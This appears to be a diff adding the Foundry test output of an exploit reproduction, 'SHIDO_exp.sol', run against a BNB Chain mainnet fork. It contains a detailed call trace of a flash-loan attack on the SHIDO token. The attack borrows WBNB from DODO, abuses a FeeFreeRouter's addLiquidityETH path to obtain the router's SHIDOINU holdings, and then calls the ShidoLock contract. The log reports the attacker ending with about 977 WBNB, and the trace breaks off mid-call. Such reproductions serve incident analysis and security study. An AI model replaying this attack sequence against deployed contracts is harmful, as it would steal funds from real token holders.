@@ -1,0 +1,304 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/SHIDO_exp.sol:ContractTest
+[PASS] testExploit() (gas: 1221286)
+Logs:
+  Attacker WBNB balance after exploit: 977.065114464703755854
+
+Traces:
+  [24333] ContractTest::setUp()
+    ├─ [0] VM::deal(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
+    │   └─ ← [Return]
+    ├─ [0] VM::createSelectFork("bsc", 29365171 [2.936e7])
+    │   └─ ← [Return] 0
+    ├─ [0] VM::label(SHIDOINU: [0x733Af324146DCfe743515D8D77DC25140a07F9e0], "SHIDOINU")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(SHIDO: [0xa963eE460Cf4b474c35ded8fFF91c4eC011FB640], "SHIDO")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], "WBNB")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(ShidoLock: [0xaF0CA21363219C8f3D8050E7B61Bb5f04e02F8D4], "ShidoLock")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], "FeeFreeRouter")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], "Router")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(dodo: [0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d], "dodo")
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+  [1365586] ContractTest::testExploit()
+    ├─ [1351935] dodo::flashLoan(40000000000000000000 [4e19], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x00)
+    │   ├─ [1349236] 0x7f60701206F85354147806a846CE59Bb7467ac53::flashLoan(40000000000000000000 [4e19], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x00) [delegatecall]
+    │   │   ├─ [29962] WBNB::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 40000000000000000000 [4e19])
+    │   │   │   ├─ emit Transfer(from: dodo: [0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 40000000000000000000 [4e19])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0 → 0x0000000000000000000000000000000000000000000000022b1c8c1227a00000
+    │   │   │   │   @ 0x3c60da1376f85a7f3c888682818856b0c611572c8d06dc51114a9951a6f90e17: 0x0000000000000000000000000000000000000000000000339921a4b40de4e632 → 0x0000000000000000000000000000000000000000000000316e0518a1e644e632
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [1290348] ContractTest::DPPFlashLoanCall(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 40000000000000000000 [4e19], 0, 0x00)
+    │   │   │   ├─ [24420] WBNB::approve(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 100000000000000000000000 [1e23])
+    │   │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 100000000000000000000000 [1e23])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x0072fde0c25a54a99a0517f551c3cabc4c49d9ef3648fd789a3f57d0243cdb90: 0 → 0x00000000000000000000000000000000000000000000152d02c7e14af6800000
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [254714] Router::swapExactTokensForTokensSupportingFeeOnTransferTokens(39000000000000000000 [3.9e19], 0, [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0x733Af324146DCfe743515D8D77DC25140a07F9e0], FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], 1687561237 [1.687e9])
+    │   │   │   │   ├─ [8948] WBNB::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xd0A167d1973cA8f76723C6FEa1E6f608DBC1d464, 39000000000000000000 [3.9e19])
+    │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xd0A167d1973cA8f76723C6FEa1E6f608DBC1d464, value: 39000000000000000000 [3.9e19])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x52e8c781a0094a02203a911a596e19fd4afe17e0de878ad829f1c65fdec48e5c: 0x00000000000000000000000000000000000000000000000255049c568d9cb316 → 0x000000000000000000000000000000000000000000000004724071b50dd8b316
+    │   │   │   │   │   │   @ 0x0072fde0c25a54a99a0517f551c3cabc4c49d9ef3648fd789a3f57d0243cdb90: 0x00000000000000000000000000000000000000000000152d02c7e14af6800000 → 0x00000000000000000000000000000000000000000000152ae58c0bec76440000
+    │   │   │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0x0000000000000000000000000000000000000000000000022b1c8c1227a00000 → 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [54398] SHIDOINU::balanceOf(FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [2893] 0xd0A167d1973cA8f76723C6FEa1E6f608DBC1d464::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 21978525030516602360 [2.197e19], 43019681436106797846 [4.301e19], 1687561189 [1.687e9]
+    │   │   │   │   ├─ [534] WBNB::balanceOf(0xd0A167d1973cA8f76723C6FEa1E6f608DBC1d464) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 82019681436106797846 [8.201e19]
+    │   │   │   │   ├─ [161351] 0xd0A167d1973cA8f76723C6FEa1E6f608DBC1d464::swap(10436972685676390697 [1.043e19], 0, FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], 0x)
+    │   │   │   │   │   ├─ [113107] SHIDOINU::transfer(FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], 10436972685676390697 [1.043e19])
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0xd0A167d1973cA8f76723C6FEa1E6f608DBC1d464, to: FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], value: 10436972685676390697 [1.043e19])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0x8bf0fbbf83b2a2fb4d708171a4b0d9cca3a1d152450e64bc374f362ee2235e9c: 0 → 0x17912dcda5384b019d1b82c74d7489194de82225860e2e4ef6c5c1cd4ac475f3
+    │   │   │   │   │   │   │   @ 0x78d66bb6e52cf8b5a2f5c78744a88db9f806920fa6e8affb86d03d44a6fad3e2: 0x31a0de8aa05e30960b2caa8bd532a1c6f6e15b74b84d8cc5b51c9d7c00e2fb85 → 0x1a0fb0bcfb25e5946e1127c487be18ada8f9394f323f5e76be56dbaeb61e8592
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [14398] SHIDOINU::balanceOf(0xd0A167d1973cA8f76723C6FEa1E6f608DBC1d464) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 11541552344840211663 [1.154e19]
+    │   │   │   │   │   ├─ [534] WBNB::balanceOf(0xd0A167d1973cA8f76723C6FEa1E6f608DBC1d464) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 82019681436106797846 [8.201e19]
+    │   │   │   │   │   ├─ emit Sync(reserve0: 11541552344840211663 [1.154e19], reserve1: 82019681436106797846 [8.201e19])
+    │   │   │   │   │   ├─ emit Swap(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 0, amount1In: 39000000000000000000 [3.9e19], amount0Out: 10436972685676390697 [1.043e19], amount1Out: 0, to: FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 9: 0x00000000000000000000000000026a8e3a0107afffd1de8b4eab0f67d45686a9 → 0x00000000000000000000000000026a8e3a5efb9ce9f7ba2251cc034d9cb4e3f9
+    │   │   │   │   │   │   @ 10: 0x000000000000000000000000000000115391da058b5ca5bebdac1818d9450934 → 0x0000000000000000000000000000001153aa5fe525434953b8a4aa2d4de1cb74
+    │   │   │   │   │   │   @ 8: 0x649623e500000000000255049c568d9cb316000000000001310368116af935f8 → 0x64962415000000000004724071b50dd8b316000000000000a02bd4b536c70ccf
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [14398] SHIDOINU::balanceOf(FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 10436972685676390697 [1.043e19]
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [9195] WBNB::withdraw(10000000000000000 [1e16])
+    │   │   │   │   ├─ [55] ContractTest::receive{value: 10000000000000000}()
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ emit Withdrawal(src: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], wad: 10000000000000000 [1e16])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000 → 0x0000000000000000000000000000000000000000000000000dbd2fc137a30000
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [173049] Router::swapExactTokensForTokensSupportingFeeOnTransferTokens(10000000000000000 [1e16], 0, [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0x733Af324146DCfe743515D8D77DC25140a07F9e0], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1687561237 [1.687e9])
+    │   │   │   │   ├─ [4148] WBNB::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xd0A167d1973cA8f76723C6FEa1E6f608DBC1d464, 10000000000000000 [1e16])
+    │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xd0A167d1973cA8f76723C6FEa1E6f608DBC1d464, value: 10000000000000000 [1e16])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x0072fde0c25a54a99a0517f551c3cabc4c49d9ef3648fd789a3f57d0243cdb90: 0x00000000000000000000000000000000000000000000152ae58c0bec76440000 → 0x00000000000000000000000000000000000000000000152ae56884fa06830000
+    │   │   │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0x0000000000000000000000000000000000000000000000000dbd2fc137a30000 → 0x0000000000000000000000000000000000000000000000000d99a8cec7e20000
+    │   │   │   │   │   │   @ 0x52e8c781a0094a02203a911a596e19fd4afe17e0de878ad829f1c65fdec48e5c: 0x000000000000000000000000000000000000000000000004724071b50dd8b316 → 0x0000000000000000000000000000000000000000000000047263f8a77d99b316
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [18398] SHIDOINU::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [893] 0xd0A167d1973cA8f76723C6FEa1E6f608DBC1d464::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 11541552344840211663 [1.154e19], 82019681436106797846 [8.201e19], 1687561237 [1.687e9]
+    │   │   │   │   ├─ [534] WBNB::balanceOf(0xd0A167d1973cA8f76723C6FEa1E6f608DBC1d464) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 82029681436106797846 [8.202e19]
+    │   │   │   │   ├─ [127486] 0xd0A167d1973cA8f76723C6FEa1E6f608DBC1d464::swap(1403480029560454 [1.403e15], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   │   │   │   ├─ [98526] SHIDOINU::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1403480029560454 [1.403e15])
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0xd0A167d1973cA8f76723C6FEa1E6f608DBC1d464, to: 0x2B7F760F37A23832E9766AeA69Dc02a038E96BB1, value: 84208801773627 [8.42e13])
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0xd0A167d1973cA8f76723C6FEa1E6f608DBC1d464, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1403480029561 [1.403e12])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96: 0 → 0x000000352b3e3d113de49a3cb6d354083122d013402cbbcec1f1fc100ddbf063
+    │   │   │   │   │   │   │   @ 0x20ba2c10a413242b8ef9dd7422852e401029c425619c5915a50e9dd3f2c46a87: 0x002cc693bfa7fe76441cc25cc3b2ac4731511617c78f830164643a6707a02207 → 0x002cd309e23e4e7b6720357bb15282ed00f61f730525df45b8f2e7cd9937e420
+    │   │   │   │   │   │   │   @ 0x78d66bb6e52cf8b5a2f5c78744a88db9f806920fa6e8affb86d03d44a6fad3e2: 0x1a0fb0bcfb25e5946e1127c487be18ada8f9394f323f5e76be56dbaeb61e8592 → 0x1a0ee10c10075a937fe526c56edced5d923a2997c19f57cf67b2ac0d45846bb0
+    │   │   │   │   │   │   │   @ 0x5982c18f27cf1d76b1575aafa82632142d484bf9cf9ec41c746a790053b98155: 0x0019895cb6d21022735fbb6cc0c0952536ef8d91465bf928ae320d501ebef7dd → 0x001a4c62541c0e0d00a3af10352e95c74ce6c3da3938e7bcee55937aefe55f43
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [14398] SHIDOINU::balanceOf(0xd0A167d1973cA8f76723C6FEa1E6f608DBC1d464) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 11540148864810651209 [1.154e19]
+    │   │   │   │   │   ├─ [534] WBNB::balanceOf(0xd0A167d1973cA8f76723C6FEa1E6f608DBC1d464) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 82029681436106797846 [8.202e19]
+    │   │   │   │   │   ├─ emit Sync(reserve0: 11540148864810651209 [1.154e19], reserve1: 82029681436106797846 [8.202e19])
+    │   │   │   │   │   ├─ emit Swap(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 0, amount1In: 10000000000000000 [1e16], amount0Out: 1403480029560454 [1.403e15], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 8: 0x64962415000000000004724071b50dd8b316000000000000a02bd4b536c70ccf → 0x649624150000000000047263f8a77d99b316000000000000a026d8400e2a8e49
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [14398] SHIDOINU::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 1403480029561 [1.403e12]
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [24683] SHIDOINU::approve(FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], 1000000000000000000000000000 [1e27])
+    │   │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], value: 1000000000000000000000000000 [1e27])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xf947576712b5cc461abb50952c228703dd937cc767310a5cb2464dd55e8490c5: 0 → 0x0000000000000000000000000000000000000000033b2e3c9fd0803ce8000000
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [416761] FeeFreeRouter::addLiquidityETH{value: 10000000000000000}(SHIDOINU: [0x733Af324146DCfe743515D8D77DC25140a07F9e0], 1000000000 [1e9], 1, 1, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1687561237 [1.687e9])
+    │   │   │   │   ├─ [60806] SHIDOINU::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], 1000000000 [1e9])
+    │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], value: 1000000000 [1e9])
+    │   │   │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], value: 999999999999999999000000000 [9.999e26])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x8bf0fbbf83b2a2fb4d708171a4b0d9cca3a1d152450e64bc374f362ee2235e9c: 0x17912dcda5384b019d1b82c74d7489194de82225860e2e4ef6c5c1cd4ac475f3 → 0x17912dcdaeeb08da61d1c3c8832380f8d73c3e035549bd3204da08bbe53803f3
+    │   │   │   │   │   │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96: 0x000000352b3e3d113de49a3cb6d354083122d013402cbbcec1f1fc100ddbf063 → 0x00000035218b7f38792e593b81245c28a7ceb43570f12cebb3ddb52173686263
+    │   │   │   │   │   │   @ 0xf947576712b5cc461abb50952c228703dd937cc767310a5cb2464dd55e8490c5: 0x0000000000000000000000000000000000000000033b2e3c9fd0803ce8000000 → 0x0000000000000000000000000000000000000000033b2e3c9fd0803cac653600
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [2785] SHIDOINU::allowance(FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], 0xC9a0F685F39d05D835c369036251ee3aEaaF3c47) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457235799758663681750 [1.157e77]
+    │   │   │   │   ├─ [235368] 0xC9a0F685F39d05D835c369036251ee3aEaaF3c47::addLiquidityETH{value: 10000000000000000}(SHIDOINU: [0x733Af324146DCfe743515D8D77DC25140a07F9e0], 1000000000 [1e9], 1, 1, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1687561237 [1.687e9])
+    │   │   │   │   │   ├─ [2644] 0x4693B62E5fc9c0a45F89D62e6300a03C85f43137::getPair(SHIDOINU: [0x733Af324146DCfe743515D8D77DC25140a07F9e0], WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0xa8aeeA8105F4A10a96fCa539697bFA6F762d0F64
+    │   │   │   │   │   ├─ [2540] 0xa8aeeA8105F4A10a96fCa539697bFA6F762d0F64::getReserves() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 77600061351417972 [7.76e16], 48812736831150400422 [4.881e19], 1687543480 [1.687e9]
+    │   │   │   │   │   ├─ [70208] SHIDOINU::transferFrom(FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], 0xa8aeeA8105F4A10a96fCa539697bFA6F762d0F64, 1000000000 [1e9])
+    │   │   │   │   │   │   ├─ emit Transfer(from: FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], to: 0xa8aeeA8105F4A10a96fCa539697bFA6F762d0F64, value: 1000000000 [1e9])
+    │   │   │   │   │   │   ├─ emit Approval(owner: FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], spender: 0xC9a0F685F39d05D835c369036251ee3aEaaF3c47, value: 115792089237316195423570985008687907853269984665640564039457235799757663681750 [1.157e77])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0x916752a0ff5fddb6a876107194b9e78632262b36ed2ede1eea30c3e41fc1519e: 0xfffffffffffffffffffffffffffffffffffffffffffffffffb2aea87452986d6 → 0xfffffffffffffffffffffffffffffffffffffffffffffffffb2aea87098ebcd6
+    │   │   │   │   │   │   │   @ 0x8bf0fbbf83b2a2fb4d708171a4b0d9cca3a1d152450e64bc374f362ee2235e9c: 0x17912dcdaeeb08da61d1c3c8832380f8d73c3e035549bd3204da08bbe53803f3 → 0x17912dcda5384b019d1b82c74d7489194de82225860e2e4ef6c5c1cd4ac475f3
+    │   │   │   │   │   │   │   @ 0x83130cc0d15594e4f640f5c39bac57271c505debf8b4ded871c481fe986fb91b: 0x002cdb7c07204a98ada20800aa41079e4fa51979ba1e206133fb481287fec0bc → 0x002cdb7c10d3087172584901dfefff7dd8f935578959af44420f8f0122724ebc
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [23974] WBNB::deposit{value: 629029616485}()
+    │   │   │   │   │   │   ├─ emit Deposit(dst: 0xC9a0F685F39d05D835c369036251ee3aEaaF3c47, wad: 629029616485 [6.29e11])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0xf6f4d16e9e827ff3aeddd3f7cf57141541c0d0f8338bc1b5c778fa4baac53716: 0 → 0x0000000000000000000000000000000000000000000000000000009275163b65
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   ├─ [8062] WBNB::transfer(0xa8aeeA8105F4A10a96fCa539697bFA6F762d0F64, 629029616485 [6.29e11])
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0xC9a0F685F39d05D835c369036251ee3aEaaF3c47, to: 0xa8aeeA8105F4A10a96fCa539697bFA6F762d0F64, value: 629029616485 [6.29e11])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0xe2a5dbda55e712d3b74b7b1a3b48f29fca3e8f5f250ec633df920a6e8580ccfc: 0x000000000000000000000000000000000000000000000002a569ad86e758a3a6 → 0x000000000000000000000000000000000000000000000002a569ae195c6edf0b
+    │   │   │   │   │   │   │   @ 0xf6f4d16e9e827ff3aeddd3f7cf57141541c0d0f8338bc1b5c778fa4baac53716: 0x0000000000000000000000000000000000000000000000000000009275163b65 → 0
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [101090] 0xa8aeeA8105F4A10a96fCa539697bFA6F762d0F64::mint(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   │   │   │   ├─ [14398] SHIDOINU::balanceOf(0xa8aeeA8105F4A10a96fCa539697bFA6F762d0F64) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 77600062351417972 [7.76e16]
+    │   │   │   │   │   │   ├─ [534] WBNB::balanceOf(0xa8aeeA8105F4A10a96fCa539697bFA6F762d0F64) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 48812737460180016907 [4.881e19]
+    │   │   │   │   │   │   ├─ [2338] 0x4693B62E5fc9c0a45F89D62e6300a03C85f43137::feeTo() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x1551EAC5D2EDAa634f713A526866Ad83b82b5209
+    │   │   │   │   │   │   ├─ [2381] 0x4693B62E5fc9c0a45F89D62e6300a03C85f43137::feeToTreasury() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000001551eac5d2edaa634f713a526866ad83b82b5209
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 24435333142 [2.443e10])
+    │   │   │   │   │   │   ├─ emit Sync(reserve0: 77600062351417972 [7.76e16], reserve1: 48812737460180016907 [4.881e19])
+    │   │   │   │   │   │   ├─ emit Mint(sender: 0xC9a0F685F39d05D835c369036251ee3aEaaF3c47, amount0: 1000000000 [1e9], amount1: 629029616485 [6.29e11])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 11: 0x00000000000000000000000000000000d3b6fedbd16d6def25d454f201f5a173 → 0x00000000000000000000000000000000d3d339885f5424bf9e922af01189b287
+    │   │   │   │   │   │   │   @ 0: 0x0000000000000000000000000000000000000000000000001a5098b61a200518 → 0x0000000000000000000000000000000000000000000000001a5098bbca959d2e
+    │   │   │   │   │   │   │   @ 10: 0x000000000000000000000000000242f98069df9ca6a2ecae7f151af2bfeb9bbb → 0x000000000000000000000000000243a3eff8c5fee9673e64f400c192cbc6c66a
+    │   │   │   │   │   │   │   @ 9: 0x6495deb8000000000002a569ad86e758a3a60000000000000113b0d83b665874 → 0x64962415000000000002a569ae195c6edf0b0000000000000113b0d877012274
+    │   │   │   │   │   │   │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96: 0 → 0x00000000000000000000000000000000000000000000000000000005b0759816
+    │   │   │   │   │   │   │   @ 12: 0x0000000000000000000000000000000002d9847a3d8fda407138cfbfc28f3738 → 0x0000000000000000000000000000000002d9847b7901c08e44c7e92997e786fc
+    │   │   │   │   │   │   └─ ← [Return] 24435333142 [2.443e10]
+    │   │   │   │   │   ├─ [55] FeeFreeRouter::fallback{value: 9999370970383515}()
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   └─ ← [Return] 1000000000 [1e9], 629029616485 [6.29e11], 24435333142 [2.443e10]
+    │   │   │   │   ├─ [644] 0x4693B62E5fc9c0a45F89D62e6300a03C85f43137::getPair(SHIDOINU: [0x733Af324146DCfe743515D8D77DC25140a07F9e0], WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0xa8aeeA8105F4A10a96fCa539697bFA6F762d0F64
+    │   │   │   │   ├─ [14398] SHIDOINU::balanceOf(FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 10436972685676390697 [1.043e19]
+    │   │   │   │   ├─ [57909] SHIDOINU::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 10436972685676390697 [1.043e19])
+    │   │   │   │   │   ├─ emit Transfer(from: FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 10436972685676390697 [1.043e19])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96: 0x00000035218b7f38792e593b81245c28a7ceb43570f12cebb3ddb52173686263 → 0x17912e02c6c3ca3a1649dc02ce98e541f5b6d65af6ff5b3aaaa376eebe2cd856
+    │   │   │   │   │   │   @ 0x8bf0fbbf83b2a2fb4d708171a4b0d9cca3a1d152450e64bc374f362ee2235e9c: 0x17912dcda5384b019d1b82c74d7489194de82225860e2e4ef6c5c1cd4ac475f3 → 0
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [55] ContractTest::receive{value: 9999370970383515}()
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ emit LiquidityAdded(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: SHIDOINU: [0x733Af324146DCfe743515D8D77DC25140a07F9e0], param2: WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], param3: 1000000000 [1e9], param4: 629029616485 [6.29e11], param5: 24435333142 [2.443e10])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x7ec9f9f181b377d53faecb2b12eec3db32f931e7d7156687c48170ea0c75095c: 0 → 0x00000000000000000000000000000000000000000000000000000005b0759816
+    │   │   │   │   └─ ← [Return] 1000000000 [1e9], 629029616485 [6.29e11], 24435333142 [2.443e10]
+    │   │   │   ├─ [24683] SHIDOINU::approve(ShidoLock: [0xaF0CA21363219C8f3D8050E7B61Bb5f04e02F8D4], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: ShidoLock: [0xaF0CA21363219C8f3D8050E7B61Bb5f04e02F8D4], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xbfbd819bee7413a014b56cf4a503f98b570a1273403ef6f1c629ebd3e612b335: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [111575] ShidoLock::lockTokens()
+    │   │   │   │   ├─ [14398] SHIDOINU::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 10436974088156420258 [1.043e19]
+    │   │   │   │   ├─ [69606] SHIDOINU::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x7ef6E527969054afbc0980E00C51D2E645b4A5ef, 10436974088156420258 [1.043e19])
